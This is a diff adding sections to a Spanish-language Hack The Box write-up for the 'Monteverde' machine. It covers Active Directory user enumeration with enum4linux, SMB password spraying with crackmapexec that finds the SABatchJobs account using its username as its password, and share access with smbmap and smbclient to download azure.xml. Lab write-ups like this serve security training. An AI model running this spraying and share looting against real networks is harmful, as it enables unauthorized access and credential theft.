@@ -79,6 +79,169 @@ Host script results:
 
 ```
 
+<img src="https://github.com/El-Palomo/MONTEVERDE-HTB/blob/main/Monte1.jpg" width=80% />
+
+
+## 3. Enumeración
+
+- Podemos enumerar utilizando ENUM4LINUX o AUTORECON.
+
+```
+┌──(root㉿kali)-[~/HT/MONTEVERDE]
+└─# enum4linux -a -M -l -d 10.129.127.11
+```
+
+- Se identifican usuarios de acceso al AD.
+
+<img src="https://github.com/El-Palomo/MONTEVERDE-HTB/blob/main/Monte2.jpg" width=80% />
+
+```
+dgalanos
+mhope
+roleary
+SABatchJobs
+smorgan
+svc-ata
+svc-bexec
+svc-netapp
+```
+
+## 4. Explotación
+
+### 4.1. Cracking ONLINE
+
+- Realizamos un ataque de cracking con los usuarios identificados. Tenemos dos opciones:
+* Todos los usuarios con el diccionario ROCKYOU (que demoraría mucho)
+* Todos los usuarios con contraseñas muy débiles. Usuario = Contraseña
+
+```
+┌──(root㉿kali)-[~/HT/MONTEVERDE]
+└─# crackmapexec smb 10.129.127.11 -u users.txt -p users.txt --shares --pass-pol           
+SMB         10.129.127.11   445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:dgalanos STATUS_LOGON_FAILURE 
+SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:mhope STATUS_LOGON_FAILURE 
+SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:roleary STATUS_LOGON_FAILURE 
+SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:SABatchJobs STATUS_LOGON_FAILURE 
+SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:smorgan STATUS_LOGON_FAILURE 
+SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:svc-ata STATUS_LOGON_FAILURE 
+SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:svc-bexec STATUS_LOGON_FAILURE 
+SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:svc-netapp STATUS_LOGON_FAILURE 
+SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:dgalanos STATUS_LOGON_FAILURE 
+SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:mhope STATUS_LOGON_FAILURE 
+SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:roleary STATUS_LOGON_FAILURE 
+SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:SABatchJobs STATUS_LOGON_FAILURE 
+SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:smorgan STATUS_LOGON_FAILURE 
+SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-ata STATUS_LOGON_FAILURE 
+SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-bexec STATUS_LOGON_FAILURE 
+SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-netapp STATUS_LOGON_FAILURE 
+SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:dgalanos STATUS_LOGON_FAILURE 
+SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:mhope STATUS_LOGON_FAILURE 
+SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:roleary STATUS_LOGON_FAILURE 
+SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:SABatchJobs STATUS_LOGON_FAILURE 
+SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:smorgan STATUS_LOGON_FAILURE 
+SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:svc-ata STATUS_LOGON_FAILURE 
+SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:svc-bexec STATUS_LOGON_FAILURE 
+SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:svc-netapp STATUS_LOGON_FAILURE 
+SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:dgalanos STATUS_LOGON_FAILURE 
+SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:mhope STATUS_LOGON_FAILURE 
+SMB         10.129.127.11   445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:roleary STATUS_LOGON_FAILURE 
+SMB         10.129.127.11   445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
+SMB         10.129.127.11   445    MONTEVERDE       [+] Enumerated shares
+SMB         10.129.127.11   445    MONTEVERDE       Share           Permissions     Remark
+SMB         10.129.127.11   445    MONTEVERDE       -----           -----------     ------
+SMB         10.129.127.11   445    MONTEVERDE       ADMIN$                          Remote Admin
+SMB         10.129.127.11   445    MONTEVERDE       azure_uploads   READ            
+SMB         10.129.127.11   445    MONTEVERDE       C$                              Default share
+SMB         10.129.127.11   445    MONTEVERDE       E$                              Default share
+SMB         10.129.127.11   445    MONTEVERDE       IPC$            READ            Remote IPC
+SMB         10.129.127.11   445    MONTEVERDE       NETLOGON        READ            Logon server share 
+SMB         10.129.127.11   445    MONTEVERDE       SYSVOL          READ            Logon server share 
+SMB         10.129.127.11   445    MONTEVERDE       users$          READ            
+SMB         10.129.127.11   445    MONTEVERDE       [+] Dumping password info for domain: MEGABANK
+SMB         10.129.127.11   445    MONTEVERDE       Minimum password length: 7
+SMB         10.129.127.11   445    MONTEVERDE       Password history length: 24
+SMB         10.129.127.11   445    MONTEVERDE       Maximum password age: 41 days 23 hours 53 minutes 
+SMB         10.129.127.11   445    MONTEVERDE       
+SMB         10.129.127.11   445    MONTEVERDE       Password Complexity Flags: 000000
+SMB         10.129.127.11   445    MONTEVERDE       	Domain Refuse Password Change: 0
+SMB         10.129.127.11   445    MONTEVERDE       	Domain Password Store Cleartext: 0
+SMB         10.129.127.11   445    MONTEVERDE       	Domain Password Lockout Admins: 0
+SMB         10.129.127.11   445    MONTEVERDE       	Domain Password No Clear Change: 0
+SMB         10.129.127.11   445    MONTEVERDE       	Domain Password No Anon Change: 0
+SMB         10.129.127.11   445    MONTEVERDE       	Domain Password Complex: 0
+```
+
+<img src="https://github.com/El-Palomo/MONTEVERDE-HTB/blob/main/Monte3.jpg" width=80% />
+
+
+### 4.2. Carpeta compartida
+
+- Listamos las carpetas que tiene el usuario SABatchJobs
+- El usuario tiene acceso a la carpeta USERS$
+
+```
+┌──(root㉿kali)-[~/HT/MONTEVERDE]
+└─# smbmap -H 10.129.127.11 -u SABatchJobs -p 'SABatchJobs' -R
+```
+
+<img src="https://github.com/El-Palomo/MONTEVERDE-HTB/blob/main/Monte4jpg" width=80% />
+
+- Accedemos a la carpeta compartida y vemos el contenido del archvivo AZURE.XML
+
+```
+┌──(root㉿kali)-[~/HT/MONTEVERDE]
+└─# smbclient \\\\10.129.127.11\\users$\\ -U SABatchJobs
+Enter WORKGROUP\SABatchJobs's password: 
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Fri Jan  3 08:12:48 2020
+  ..                                  D        0  Fri Jan  3 08:12:48 2020
+  dgalanos                            D        0  Fri Jan  3 08:12:30 2020
+  mhope                               D        0  Fri Jan  3 08:41:18 2020
+  roleary                             D        0  Fri Jan  3 08:10:30 2020
+  smorgan                             D        0  Fri Jan  3 08:10:24 2020
+
+		309503 blocks of size 4096. 303390 blocks available
+smb: \> cd mhope
+smb: \mhope\> dir
+  .                                   D        0  Fri Jan  3 08:41:18 2020
+  ..                                  D        0  Fri Jan  3 08:41:18 2020
+  azure.xml                          AR     1212  Fri Jan  3 08:40:23 2020
+
+		309503 blocks of size 4096. 303390 blocks available
+smb: \mhope\> get azure.xml
+```
+
+<img src="https://github.com/El-Palomo/MONTEVERDE-HTB/blob/main/Monte5.jpg" width=80% />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
